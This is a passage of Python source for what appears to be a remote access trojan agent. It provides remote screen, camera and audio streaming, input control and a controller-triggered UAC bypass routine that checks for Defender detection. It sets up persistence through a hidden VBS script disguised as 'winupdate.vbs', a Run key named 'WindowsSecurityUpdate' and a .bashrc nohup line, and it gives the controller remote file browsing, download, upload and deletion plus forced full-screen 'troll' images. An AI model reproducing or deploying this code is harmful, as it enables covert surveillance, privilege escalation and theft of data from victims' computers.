            safe_emit('webrtc_adaptive_bitrate_result', {
                'agent_id': agent_id,
                'current_quality': current_quality,
                'result': result
            })
        else:
            log_message("WebRTC streams not available for adaptive bitrate control", "warning")
            
    except Exception as e:
        error_msg = f"WebRTC adaptive bitrate control failed: {str(e)}"
        log_message(error_msg, "error")
        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})

def on_webrtc_implement_frame_dropping(data):
    if not SOCKETIO_AVAILABLE or sio is None:
        log_message("Socket.IO not available, cannot handle WebRTC implement frame dropping", "warning")
        return
    """Handle request to manually implement frame dropping."""
    try:
        agent_id = data.get('agent_id', get_or_create_agent_id())
        load_threshold = data.get('load_threshold', 0.8)
        
        log_message(f"Manually implementing frame dropping for agent {agent_id}")
        
        if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
            # Implement frame dropping
            result = implement_frame_dropping(agent_id, load_threshold)
            safe_emit('webrtc_frame_dropping_result', {
                'agent_id': agent_id,
                'load_threshold': load_threshold,
                'result': result
            })
        else:
            log_message("WebRTC streams not available for frame dropping", "warning")
            
    except Exception as e:
        error_msg = f"WebRTC frame dropping implementation failed: {str(e)}"
        log_message(error_msg, "error")
        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})

def on_feature_toggle(data):
    if not SOCKETIO_AVAILABLE or sio is None:
        return
    try:
        feature = str((data or {}).get('feature') or '').strip()
        enabled = bool((data or {}).get('enabled'))
        global WEBRTC_CONFIG
        global UAC_BYPASS_ALLOWED, DISABLE_UAC_BYPASS, BYPASSES_ENABLED
        if feature == 'adaptive_bitrate':
            WEBRTC_CONFIG['adaptive_bitrate'] = enabled
        elif feature == 'frame_dropping':
            WEBRTC_CONFIG['frame_dropping'] = enabled
        elif feature == 'monitoring':
            m = WEBRTC_CONFIG.get('monitoring') or {}
            m['connection_quality_metrics'] = enabled
            WEBRTC_CONFIG['monitoring'] = m
        elif feature == 'uac_bypass':
            UAC_BYPASS_ALLOWED = enabled
            DISABLE_UAC_BYPASS = not enabled
            BYPASSES_ENABLED = enabled
        safe_emit('feature_toggle_applied', {'feature': feature, 'enabled': enabled, 'agent_id': get_or_create_agent_id()})
    except Exception as e:
        log_message(f"Feature toggle error: {str(e)}", "error")

def run_uac_bypass_test(method_name: str) -> dict:
    agent_id = None
    try:
        agent_id = get_or_create_agent_id()
    except Exception:
        agent_id = 'unknown'
    name = str(method_name or '').strip().lower()
    emit_bypass_test_debug(None, name, action='click', status='pending', point='handler.enter')
    pre = _collect_bypass_debug_context(None, name)
    if not WINDOWS_AVAILABLE:
        emit_bypass_test_debug(None, name, action='skip', status='skipped', reason='not_windows', point='handler.platform', extra={'pre': pre})
        return {'agent_id': agent_id, 'method': name, 'status': 'skipped', 'reason': 'not_windows', 'context': pre}
    try:
        if DISABLE_UAC_BYPASS or not UAC_BYPASS_ALLOWED:
            emit_bypass_test_debug(None, name, action='skip', status='skipped', reason='disabled_or_not_allowed', point='handler.global', extra={'pre': pre})
            return {'agent_id': agent_id, 'method': name, 'status': 'skipped', 'reason': 'disabled_or_not_allowed', 'context': pre}
    except Exception:
        pass
    if is_admin():
        emit_bypass_test_debug(None, name, action='skip', status='skipped', reason='already_admin', point='handler.admin', extra={'pre': pre})
        return {'agent_id': agent_id, 'method': name, 'status': 'skipped', 'reason': 'already_admin', 'context': pre}
    try:
        if should_skip_uac_method(None, name):
            emit_bypass_test_debug(None, name, action='skip', status='skipped', reason='defender_detection', point='handler.defender', extra={'pre': pre})
            return {'agent_id': agent_id, 'method': name, 'status': 'skipped', 'reason': 'defender_detection', 'context': pre}
    except Exception:
        pass
    try:
        enabled = bool(UAC_BYPASS_METHODS_ENABLED.get(name, True))
        if not enabled and UAC_BYPASS_ALLOWED and not DISABLE_UAC_BYPASS:
            UAC_BYPASS_METHODS_ENABLED[name] = True
    except Exception:
        pass
    try:
        manager = get_uac_manager()
        method_obj = manager.methods.get(name)
        if not method_obj or not method_obj.is_available():
            emit_bypass_test_debug(None, name, action='skip', status='skipped', reason='not_available', point='handler.available', extra={'pre': pre})
            return {'agent_id': agent_id, 'method': name, 'status': 'skipped', 'reason': 'not_available', 'context': pre}
    except Exception as e:
        emit_bypass_test_debug(None, name, action='error', status='error', reason=str(e), point='handler.manager')
        return {'agent_id': agent_id, 'method': name, 'status': 'error', 'reason': str(e), 'context': pre}
    emit_bypass_test_debug(None, name, action='execute', status='pending', point='handler.execute', extra={'pre': pre})
    try:
        ok = manager.execute_method(name)
        status = 'success' if ok else 'failed'
        emit_bypass_test_debug(None, name, action='result', status=status, point='handler.result', extra={'pre': pre})
        return {'agent_id': agent_id, 'method': name, 'status': status, 'context': _collect_bypass_debug_context(None, name)}
    except Exception as e:
        emit_bypass_test_debug(None, name, action='error', status='error', reason=str(e), point='handler.execute_error')
        return {'agent_id': agent_id, 'method': name, 'status': 'error', 'reason': str(e), 'context': _collect_bypass_debug_context(None, name)}

def on_uac_bypass_test(data):
    try:
        method = (data or {}).get('method') or (data or {}).get('name')
        res = run_uac_bypass_test(method)
        try:
            safe_emit('uac_bypass_test_result', res)
        except Exception:
            pass
        _write_structured_debug({'event': 'bypass_test_result', **res}, 'info' if res.get('status') == 'success' else 'warning')
    except Exception as e:
        err = {'event': 'bypass_test_result', 'status': 'error', 'reason': str(e)}
        _write_structured_debug(err, 'error')
        try:
            safe_emit('uac_bypass_test_result', err)
        except Exception:
            pass
def get_webrtc_status():
    """Get comprehensive WebRTC status and capabilities."""
    status = {
        'enabled': WEBRTC_ENABLED,
        'aiortc_available': AIORTC_AVAILABLE,
        'aiohttp_available': AIOHTTP_AVAILABLE,
        'signaling_available': AIORTC_SIGNALING_AVAILABLE,
        'active_connections': len(WEBRTC_PEER_CONNECTIONS),
        'active_streams': len(WEBRTC_STREAMS),
        'ice_servers': len(WEBRTC_ICE_SERVERS),
        'capabilities': {
            'screen_capture': MSS_AVAILABLE or CV2_AVAILABLE,
            'audio_capture': PYAUDIO_AVAILABLE,
            'camera_capture': CV2_AVAILABLE,
            'hardware_encoding': HAS_DXCAM or CV2_AVAILABLE,
        }
    }
    
    if WEBRTC_ENABLED and AIORTC_AVAILABLE:
        status['recommended_codecs'] = ['VP8', 'VP9', 'H.264']
        status['latency_target'] = 'sub-second'
        status['scalability'] = 'SFU-ready'
    else:
        status['fallback_method'] = 'Socket.IO'
        status['latency_target'] = 'single-digit seconds'
    
    return status

def emit_webrtc_status():
    """Emit WebRTC status to controller."""
    try:
        agent_id = get_or_create_agent_id()
        status = get_webrtc_status()
        safe_emit('webrtc_status', {'agent_id': agent_id, 'status': status})
        log_message(f"WebRTC status emitted: {status['enabled']}")
    except Exception as e:
        log_message(f"Failed to emit WebRTC status: {e}", "error")

def initialize_components():
    """Initialize high-performance components and input controllers."""
    global high_performance_capture, low_latency_input, mouse_controller, keyboard_controller
    
    # Initialize input controllers
    try:
        mouse_controller = pynput.mouse.Controller()
        keyboard_controller = pynput.keyboard.Controller()
        log_message("[OK] Input controllers initialized")
    except Exception as e:
        log_message(f"[WARN] Failed to initialize input controllers: {e}")
        mouse_controller = None
        keyboard_controller = None
    
    # Initialize high-performance capture
    try:
        high_performance_capture = HighPerformanceCapture(
            target_fps=60,
            quality=85,
            enable_delta_compression=True
        )
        log_message("[OK] High-performance capture initialized")
    except Exception as e:
        log_message(f"[WARN] Failed to initialize high-performance capture: {e}")
        high_performance_capture = None
    
    # Initialize low-latency input handler
    try:
        low_latency_input = LowLatencyInputHandler()
        low_latency_input.start()
        log_message("[OK] Low-latency input handler initialized")
    except Exception as e:
        log_message(f"[WARN] Failed to initialize low-latency input: {e}")
        low_latency_input = None
    
    # Initialize WebRTC components if available
    if AIORTC_AVAILABLE:
        try:
            # Set up WebRTC event loop for async operations
            if not asyncio.get_event_loop().is_running():
                asyncio.set_event_loop(asyncio.new_event_loop())
            
            # Initialize WebRTC configuration
            global WEBRTC_ENABLED
            WEBRTC_ENABLED = True
            
            log_message("[OK] WebRTC components initialized for low-latency streaming")
            log_message(f"[INFO] WebRTC ICE servers: {len(WEBRTC_ICE_SERVERS)} configured")
        except Exception as e:
            log_message(f"[WARN] Failed to initialize WebRTC components: {e}")
            WEBRTC_ENABLED = False
    else:
        log_message("[INFO] WebRTC not available - using Socket.IO streaming fallback")
        WEBRTC_ENABLED = False

def add_to_startup():
    """Add agent to system startup."""
    try:
        if WINDOWS_AVAILABLE:
            # Windows startup methods - only registry, startup folder is handled by background initializer
            add_registry_startup()
        else:
            # Linux startup methods
            add_linux_startup()
    except Exception as e:
        log_message(f"[WARN] Startup configuration failed: {e}")

def add_registry_startup():
    """Add to Windows registry startup."""
    try:
        import winreg
        
        cleanup_startup_folder_artifacts()
        script_path = os.path.abspath(__file__)
        def _build_hidden_vbs(path_list):
            runner = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
            if not os.path.exists(runner):
                runner = sys.executable
            vbs = (
                'Set oShell = CreateObject("WScript.Shell")\n'
                f'oShell.CurrentDirectory = "{os.path.dirname(script_path)}"\n'
                f'oShell.Run "\"{runner}\" \"{script_path}\"", 0, false\n'
            )
            for p in path_list:
                try:
                    d = os.path.dirname(p)
                    os.makedirs(d, exist_ok=True)
                    with open(p, 'w', encoding='utf-8') as f:
                        f.write(vbs)
                    try:
                        subprocess.run(['attrib', '+s', '+h', p], creationflags=subprocess.CREATE_NO_WINDOW, check=False)
                    except Exception:
                        pass
                    return p
                except Exception:
                    continue
            return None
        hidden_candidates = [
            os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'ClientUpdate', 'winupdate.vbs'),
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Windows', 'ClientUpdate', 'winupdate.vbs'),
            os.path.join(tempfile.gettempdir(), 'Microsoft', 'Windows', 'ClientUpdate', 'winupdate.vbs'),
        ]
        hidden_vbs = _build_hidden_vbs(hidden_candidates)
        # Set HKCU Run to hidden VBS
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
        if hidden_vbs:
            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, f'wscript.exe "{hidden_vbs}"')
        else:
            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
        winreg.CloseKey(key)
        
        log_message(f"[OK] Registry persistence established (hidden VBS): {hidden_vbs or script_path}")
        
        # Verify the registry entry was created
        try:
            verify_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                      r"Software\Microsoft\Windows\CurrentVersion\Run")
            value, _ = winreg.QueryValueEx(verify_key, "WindowsSecurityUpdate")
            winreg.CloseKey(verify_key)
            log_message(f"[DEBUG] Registry entry verified: svchost32 = {value}")
        except Exception as verify_error:
            log_message(f"[WARN] Could not verify registry entry: {verify_error}")
            
    except Exception as e:
        log_message(f"[ERROR] Registry startup failed: {e}")
        # Print detailed error information
        import traceback
        log_message(f"Exception details: {traceback.format_exc()}", "error")

def add_startup_folder_entry():
    return False

def add_linux_startup():
    """Add to Linux startup."""
    try:
        # Add to .bashrc
        bashrc_path = os.path.expanduser("~/.bashrc")
        startup_line = f"nohup {sys.executable} {os.path.abspath(__file__)} > /dev/null 2>&1 &\n"
        
        # Check if already added
        with open(bashrc_path, "r") as f:
            if startup_line not in f.read():
                with open(bashrc_path, "a") as f:
                    f.write(startup_line)
                log_message("[OK] Added to Linux startup")
    except Exception as e:
        log_message(f"[WARN] Linux startup configuration failed: {e}")
def check_registry_persistence():
    """Check if registry persistence entry exists."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                           r"Software\Microsoft\Windows\CurrentVersion\Run")
        value = None
        try:
            v, _ = winreg.QueryValueEx(key, "WindowsSecurityUpdate")
            value = v
        except Exception:
            pass
        if value is None:
            try:
                v, _ = winreg.QueryValueEx(key, "ClientLauncher")
                value = v
            except Exception:
                pass
        if value is None:
            try:
                v, _ = winreg.QueryValueEx(key, "svchost32")
                value = v
            except Exception:
                pass
        winreg.CloseKey(key)
        if value:
            log_message(f"[OK] Registry persistence exists: {value}")
        else:
            log_message("[INFO] No registry persistence found")
            return False
        
        # Check if the file actually exists
        target_file = value.strip('"')
        if os.path.exists(target_file):
            log_message(f"[OK] Target file exists: {target_file}")
            return True
        else:
            log_message(f"[WARN] Target file does not exist: {target_file}")
            return False
            
    except Exception as e:
        log_message(f"[INFO] No registry persistence found: {e}")
        return False
import mimetypes
import stat
from datetime import datetime as _dt
from pathlib import Path as _Path

class FileSystemManager:
    def __init__(self, socket_client, agent_id):
        self.socket = socket_client
        self.agent_id = agent_id
        self.active_uploads = {}
        self.active_downloads = {}
        self.register_handlers()
    def register_handlers(self):
        @self.socket.on('browse_files')
        def handle_browse_files(data):
            path = data.get('path', os.path.expanduser('~'))
            try:
                files = self.list_directory(path)
                safe_emit('file_list', {'agent_id': self.agent_id, 'path': path, 'files': files})
            except Exception as e:
                safe_emit('file_list', {'agent_id': self.agent_id, 'path': path, 'files': [], 'error': str(e)})
        @self.socket.on('download_file')
        def handle_download_file(data):
            file_path = data.get('path')
            download_id = data.get('download_id')
            try:
                self.send_file(file_path, download_id)
            except Exception as e:
                safe_emit('file_chunk_from_agent', {'agent_id': self.agent_id, 'filename': os.path.basename(file_path or ''), 'download_id': download_id, 'error': str(e)})
        @self.socket.on('upload_file_start')
        def handle_upload_start(data):
            filename = data.get('filename')
            destination = data.get('destination')
            total_size = int(data.get('total_size') or 0)
            upload_id = data.get('upload_id') or f'ul_{int(time.time())}'
            try:
                import tempfile, os as _os, hashlib as _hashlib
                tmpdir = _os.path.join(tempfile.gettempdir(), 'agent_uploads')
                _os.makedirs(tmpdir, exist_ok=True)
                temp_path = _os.path.join(tmpdir, f"{upload_id}_{filename}")
                # pre-allocate to hint size
                try:
                    with open(temp_path, 'wb') as f:
                        if total_size > 0:
                            f.seek(total_size - 1)
                            f.write(b'\0')
                except Exception:
                    pass
                self.active_uploads[upload_id] = {
                    'filename': filename,
                    'destination': destination,
                    'total_size': total_size,
                    'received': 0,
                    'start_time': time.time(),
                    'temp_path': temp_path,
                    'hasher': _hashlib.sha256()
                }
            except Exception:
                self.active_uploads[upload_id] = {'filename': filename, 'destination': destination, 'total_size': total_size, 'received': 0, 'chunks': [], 'start_time': time.time()}
            safe_emit('upload_ready', {'agent_id': self.agent_id, 'upload_id': upload_id})
        @self.socket.on('upload_file_chunk')
        def handle_upload_chunk(data):
            upload_id = data.get('upload_id')
            chunk_data = data.get('chunk')
            offset = int(data.get('offset') or 0)
            if not upload_id or upload_id not in self.active_uploads:
                return
            up = self.active_uploads[upload_id]
            try:
                payload = chunk_data.split(',', 1)[1] if isinstance(chunk_data, str) and ',' in chunk_data else chunk_data
                chunk_bytes = base64.b64decode(payload if isinstance(payload, str) else chunk_data)
                temp_path = up.get('temp_path')
                if temp_path:
                    try:
                        with open(temp_path, 'r+b') as f:
                            f.seek(offset)
                            f.write(chunk_bytes)
                        up['received'] += len(chunk_bytes)
                        try:
                            h = up.get('hasher')
                            if h: h.update(chunk_bytes)
                        except Exception:
                            pass
                    except Exception:
                        up.setdefault('chunks', []).append((offset, chunk_bytes))
                        up['received'] += len(chunk_bytes)
                else:
                    up.setdefault('chunks', []).append((offset, chunk_bytes))
                    up['received'] += len(chunk_bytes)
                progress = (up['received'] / (up['total_size'] or max(1, up['received']))) * 100.0
                try:
                    self.socket.emit('file_upload_progress', {
                        'agent_id': self.agent_id,
                        'upload_id': upload_id,
                        'filename': up['filename'],
                        'destination_path': up.get('destination'),
                        'received': up['received'],
                        'total': up['total_size'],
                        'progress': int(progress)
                    })
                except Exception:
                    safe_emit('file_upload_progress', {'agent_id': self.agent_id, 'upload_id': upload_id, 'filename': up['filename'], 'destination_path': up.get('destination'), 'received': up['received'], 'total': up['total_size'], 'progress': int(progress)})
            except Exception as e:
                try:
                    self.socket.emit('file_upload_progress', {'agent_id': self.agent_id, 'upload_id': upload_id, 'filename': (self.active_uploads.get(upload_id) or {}).get('filename'), 'error': str(e)})
                except Exception:
                    safe_emit('file_upload_progress', {'agent_id': self.agent_id, 'upload_id': upload_id, 'filename': (self.active_uploads.get(upload_id) or {}).get('filename'), 'error': str(e)})
        @self.socket.on('upload_file_complete')
        def handle_upload_complete(data):
            upload_id = data.get('upload_id')
            if not upload_id or upload_id not in self.active_uploads:
                return
            up = self.active_uploads[upload_id]
            try:
                temp_path = up.get('temp_path')
                file_data = None
                if not temp_path:
                    up.get('chunks', []).sort(key=lambda x: x[0])
                    file_data = b''.join([c for _, c in up.get('chunks', [])])
                dest_dir = up.get('destination') or os.path.expanduser('~')
                try:
                    import re
                    # Normalize Windows-style rootless paths like "/cc" -> "C:\cc"
                    if os.name == 'nt':
                        raw = str(dest_dir).strip()
                        if raw and not re.match(r'^[A-Za-z]:', raw):
                            if raw.startswith('/') or raw.startswith('\\'):
                                drive = os.environ.get('SystemDrive', 'C:')
                                dest_dir = os.path.normpath(drive + '\\' + raw.lstrip('\\/'))
                            else:
                                dest_dir = os.path.normpath(os.path.join(os.path.expanduser('~'), raw))
                        else:
                            dest_dir = os.path.normpath(raw or os.path.expanduser('~'))
                        try:
                            user_profile = os.environ.get('USERPROFILE') or os.path.expanduser('~')
                            onedrive_desktop = os.path.join(user_profile, 'OneDrive', 'Desktop')
                            if os.path.basename(dest_dir).lower() == 'desktop' and os.path.isdir(onedrive_desktop):
                                dest_dir = onedrive_desktop
                        except Exception:
                            pass
                    else:
                        dest_dir = os.path.normpath(dest_dir)
                except Exception:
                    pass
                full_path = os.path.join(dest_dir, up['filename'])
                try:
                    base_name, ext = os.path.splitext(up['filename'])
                    target_path = full_path
                    idx = 1
                    while os.path.exists(target_path):
                        target_path = os.path.join(dest_dir, f"{base_name} ({idx}){ext}")
                        idx += 1
                except Exception:
                    target_path = full_path
                try:
                    os.makedirs(dest_dir, exist_ok=True)
                except Exception:
                    if os.name == 'nt':
                        try:
                            import subprocess
                            ps_exe = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
                            mkdir_cmd = "New-Item -ItemType Directory -Force -Path '" + dest_dir.replace("'", "''") + "' | Out-Null"
                            subprocess.run([ps_exe, "-NoProfile", "-NonInteractive", "-Command", mkdir_cmd], capture_output=True, timeout=10)
                        except Exception:
                            pass
                wrote_ok = False
                write_error = None
                if temp_path:
                    try:
                        if os.path.abspath(temp_path) != os.path.abspath(target_path):
                            try:
                                if os.path.exists(target_path):
                                    os.remove(target_path)
                            except Exception:
                                pass
                            os.replace(temp_path, target_path)
                        wrote_ok = os.path.isfile(target_path)
                    except Exception as e_mv:
                        write_error = str(e_mv)
                elif os.name == 'nt':
                    try:
                        import subprocess, base64
                        ps_exe = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
                        b64 = base64.b64encode(file_data).decode('ascii')
                        ps_path = target_path.replace("'", "''")
                        ps_script = f"$b64 = [Console]::In.ReadToEnd(); [IO.File]::WriteAllBytes('{ps_path}', [Convert]::FromBase64String($b64))"
                        result = subprocess.run([ps_exe, "-NoProfile", "-NonInteractive", "-Command", ps_script], input=b64.encode('ascii'), capture_output=True, timeout=120)
                        if result.returncode == 0 and os.path.isfile(target_path) and os.path.getsize(target_path) == len(file_data):
                            wrote_ok = True
                    except Exception as e_ps:
                        write_error = str(e_ps)
                if not wrote_ok:
                    try:
                        with open(target_path, 'wb') as f:
                            f.write(file_data)
                        wrote_ok = True
                        write_error = None
                    except Exception as e_write:
                        write_error = str(e_write)
                try:
                    safe_emit('file_upload_debug', {'agent_id': self.agent_id, 'upload_id': upload_id, 'stage': 'commit', 'ok': wrote_ok, 'error': write_error, 'target_path': target_path})
                except Exception:
                    pass
                if not wrote_ok:
                    try:
                        self.socket.emit('file_upload_complete', {'agent_id': self.agent_id, 'upload_id': upload_id, 'filename': (self.active_uploads.get(upload_id) or {}).get('filename'), 'error': write_error or 'Write failed', 'success': False})
                    except Exception:
                        safe_emit('file_upload_complete', {'agent_id': self.agent_id, 'upload_id': upload_id, 'filename': (self.active_uploads.get(upload_id) or {}).get('filename'), 'error': write_error or 'Write failed', 'success': False})
                    del self.active_uploads[upload_id]
                    return
                try:
                    if temp_path and up.get('hasher'):
                        file_hash = up['hasher'].hexdigest()
                    elif file_data is not None:
                        file_hash = hashlib.sha256(file_data).hexdigest()
                    else:
                        file_hash = ''
                except Exception:
                    file_hash = ''
                elapsed = time.time() - up['start_time']
                try:
                    self.socket.emit('file_upload_complete', {
                        'agent_id': self.agent_id,
                        'upload_id': upload_id,
                        'filename': up['filename'],
                        'destination_path': target_path,
                        'size': os.path.getsize(target_path) if os.path.isfile(target_path) else (len(file_data) if file_data is not None else up.get('received', 0)),
                        'hash': file_hash,
                        'elapsed': elapsed,
                        'success': True,
                        'source': 'agent'
                    })
                except Exception:
                    safe_emit('file_upload_complete', {
                        'agent_id': self.agent_id,
                        'upload_id': upload_id,
                        'filename': up['filename'],
                        'destination_path': target_path,
                        'size': len(file_data),
                        'hash': file_hash,
                        'elapsed': elapsed,
                        'success': True,
                        'source': 'agent'
                    })
                try:
                    files = self.list_directory(dest_dir)
                    try:
                        self.socket.emit('file_list', {'agent_id': self.agent_id, 'path': dest_dir, 'files': files})
                    except Exception:
                        safe_emit('file_list', {'agent_id': self.agent_id, 'path': dest_dir, 'files': files})
                except Exception:
                    pass
                del self.active_uploads[upload_id]
            except Exception as e:
                try:
                    self.socket.emit('file_upload_complete', {'agent_id': self.agent_id, 'upload_id': upload_id, 'filename': (self.active_uploads.get(upload_id) or {}).get('filename'), 'error': str(e), 'success': False})
                except Exception:
                    safe_emit('file_upload_complete', {'agent_id': self.agent_id, 'upload_id': upload_id, 'filename': (self.active_uploads.get(upload_id) or {}).get('filename'), 'error': str(e), 'success': False})
        @self.socket.on('delete_file')
        def handle_delete_file(data):
            path = data.get('path')
            try:
                import os as _os
                ok = False
                if _os.path.isfile(path):
                    try:
                        _os.remove(path)
                        ok = True
                    except Exception:
                        ok = False
                elif _os.path.isdir(path):
                    try:
                        import shutil
                        shutil.rmtree(path)
                        ok = True
                    except Exception:
                        ok = False
                if not ok:
                    try:
                        import subprocess
                        ps_exe = _os.path.join(_os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
                        ps_path = str(path).replace("'", "''")
                        ps_cmd = f"Remove-Item -LiteralPath '{ps_path}' -Recurse -Force -ErrorAction SilentlyContinue"
                        r = subprocess.run([ps_exe, "-NoProfile", "-NonInteractive", "-Command", ps_cmd], capture_output=True, timeout=60)
                        if r.returncode == 0:
                            ok = True
                    except Exception:
                        ok = False
                safe_emit('file_op_result', {'agent_id': self.agent_id, 'op': 'delete', 'path': path, 'success': ok})
            except Exception as e:
                safe_emit('file_op_result', {'agent_id': self.agent_id, 'op': 'delete', 'path': path, 'success': False, 'error': str(e)})
        @self.socket.on('rename_file')
        def handle_rename_file(data):
            old_path = data.get('old_path')
            new_path = data.get('new_path')
            try:
                os.rename(old_path, new_path)
                safe_emit('file_op_result', {'agent_id': self.agent_id, 'op': 'rename', 'src': old_path, 'dst': new_path, 'success': True})
            except Exception as e:
                safe_emit('file_op_result', {'agent_id': self.agent_id, 'op': 'rename', 'src': old_path, 'dst': new_path, 'success': False, 'error': str(e)})
        @self.socket.on('create_directory')
        def handle_create_directory(data):
            path = data.get('path')
            try:
                os.makedirs(path, exist_ok=True)
                safe_emit('file_op_result', {'agent_id': self.agent_id, 'op': 'mkdir', 'path': path, 'success': True})
            except Exception as e:
                safe_emit('file_op_result', {'agent_id': self.agent_id, 'op': 'mkdir', 'path': path, 'success': False, 'error': str(e)})
        @self.socket.on('search_files')
        def handle_search_files(data):
            root_path = data.get('path', os.path.expanduser('~'))
            pattern = data.get('pattern', '*')
            max_results = int(data.get('max_results') or 100)
            try:
                results = self.search_files(root_path, pattern, max_results)
                safe_emit('file_list', {'agent_id': self.agent_id, 'path': root_path, 'files': results})
            except Exception as e:
                safe_emit('file_list', {'agent_id': self.agent_id, 'path': root_path, 'files': [], 'error': str(e)})
    def list_directory(self, path):
        files = []
        try:
            parent = os.path.dirname(path)
            if path and parent and parent != path:
                files.append({'name': '..', 'type': 'directory', 'path': parent, 'size': None, 'modified': None, 'permissions': None})
            for entry in os.scandir(path):
                try:
                    st = entry.stat()
                    info = {'name': entry.name, 'type': 'directory' if entry.is_dir() else 'file', 'path': entry.path, 'size': st.st_size if entry.is_file() else None, 'modified': _dt.fromtimestamp(st.st_mtime).isoformat(), 'permissions': oct(st.st_mode)[-3:], 'extension': os.path.splitext(entry.name)[1][1:] if entry.is_file() else None}
                    if entry.is_file():
                        mt, _ = mimetypes.guess_type(entry.path)
                        info['mime_type'] = mt
                    files.append(info)
                except Exception:
                    continue
            files.sort(key=lambda x: (x['type'] == 'file', x['name'].lower()))
            return files
        except Exception as e:
            raise Exception(f"Failed to list directory: {str(e)}")
    def send_file(self, file_path, download_id):
        try:
            total_size = os.path.getsize(file_path)
            filename = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                offset = 0
                while True:
                    chunk = f.read(512 * 1024)
                    if not chunk:
                        break
                    chunk_b64 = 'data:application/octet-stream;base64,' + base64.b64encode(chunk).decode('utf-8')
                    safe_emit('file_chunk_from_agent', {'agent_id': self.agent_id, 'filename': filename, 'download_id': download_id, 'chunk': chunk_b64, 'offset': offset, 'total_size': total_size})
                    offset += len(chunk)
                    progress = int((offset / total_size) * 100)
                    safe_emit('file_download_progress', {'agent_id': self.agent_id, 'filename': filename, 'download_id': download_id, 'sent': offset, 'total': total_size, 'progress': progress})
            safe_emit('file_download_complete', {'agent_id': self.agent_id, 'filename': filename, 'download_id': download_id, 'size': total_size, 'success': True})
        except Exception as e:
            safe_emit('file_chunk_from_agent', {'agent_id': self.agent_id, 'filename': os.path.basename(file_path or ''), 'download_id': download_id, 'error': str(e)})
    def search_files(self, root_path, pattern, max_results=100):
        import fnmatch
        results = []
        count = 0
        for dirpath, dirnames, filenames in os.walk(root_path):
            dirnames[:] = [d for d in dirnames if not d.startswith('.')]
            for filename in filenames:
                if fnmatch.fnmatch(filename.lower(), pattern.lower()):
                    full_path = os.path.join(dirpath, filename)
                    try:
                        st = os.stat(full_path)
                        results.append({'name': filename, 'path': full_path, 'size': st.st_size, 'modified': _dt.fromtimestamp(st.st_mtime).isoformat(), 'directory': dirpath})
                        count += 1
                        if count >= max_results:
                            return results
                    except Exception:
                        continue
        return results

def on_troll_show_image(data):
    try:
        b64 = str((data or {}).get('image_b64') or '')
        filename = str((data or {}).get('filename') or 'troll.png')
        duration_ms = int((data or {}).get('duration_ms') or 5000)
        mode = str((data or {}).get('mode') or 'cover')
        payload = base64.b64decode(b64)
        def _run():
            try:
                import tkinter as tk
                import base64 as _b64
                root = tk.Tk()
                root.attributes('-topmost', True)
                try:
                    root.attributes('-fullscreen', True)
                except Exception:
                    pass
                root.configure(bg='black')
                try:
                    photo = tk.PhotoImage(data=_b64.b64encode(payload))
                    lbl = tk.Label(root, image=photo, bg='black')
                    lbl.image = photo
                    lbl.pack(expand=True, fill='both')
                    root.after(duration_ms, root.destroy)
                    root.mainloop()
                except Exception:
                    import tempfile
                    p = os.path.join(tempfile.gettempdir(), filename)
                    with open(p, 'wb') as f:
                        f.write(payload)
                    try:
                        if sys.platform == 'win32':
                            os.startfile(p)
                        else:
                            import subprocess
                            subprocess.Popen(['xdg-open', p])
                    except Exception:
                        pass
            except Exception as e:
                try:
                    log_message(f"Troll image error: {e}", "error")
                except Exception:
                    pass
        import threading
        threading.Thread(target=_run, daemon=True).start()
        try:
            safe_emit('agent_notification', {'id': f'nt_{int(time.time())}', 'type': 'info', 'title': 'Troll', 'message': f'Showing {filename}', 'timestamp': time.time(), 'agent_id': get_or_create_agent_id(), 'category': 'agent'})
        except Exception:
            pass
    except Exception as e:
        try:
            log_message(f"Troll handler error: {e}", "error")
        except Exception:
            pass

def on_troll_show_image_ps(data):
    try:
        b64 = str((data or {}).get('image_b64') or '')
        filename = str((data or {}).get('filename') or 'troll.png')
        duration_ms = int((data or {}).get('duration_ms') or 5000)
        payload = base64.b64decode(b64)
        import tempfile
        p = os.path.join(tempfile.gettempdir(), filename)
        try:
            with open(p, 'wb') as f:
                f.write(payload)
        except Exception as e:
            log_message(f"Write image failed: {e}", "error")
            return
        script = """
Add-Type -AssemblyName PresentationFramework
$path = $args[0]
$dur = [int]$args[1]
$w = New-Object Windows.Window
$w.WindowStyle = 'None'
$w.WindowState = 'Maximized'
$w.ResizeMode = 'NoResize'
$w.Topmost = $true
$w.ShowInTaskbar = $false
$w.Background = 'Black'
$img = New-Object Windows.Controls.Image
$bmp = New-Object Windows.Media.Imaging.BitmapImage
$bmp.BeginInit()
$bmp.UriSource = $path
$bmp.CacheOption = 'OnLoad'
$bmp.EndInit()
$img.Source = $bmp
$img.Stretch = 'Uniform'
$w.Content = $img
$t = New-Object Windows.Threading.DispatcherTimer
$t.Interval = [TimeSpan]::FromMilliseconds($dur)
$t.Add_Tick({ $t.Stop(); $w.Close() })
$t.Start()
$w.ShowDialog()
"""
        s = os.path.join(tempfile.gettempdir(), f"troll_img_{int(time.time())}.ps1")
        try:
            with open(s, 'w', encoding='utf-8') as f:
                f.write(script)
        except Exception as e:
            log_message(f"Write script failed: {e}", "error")
            return
        try:
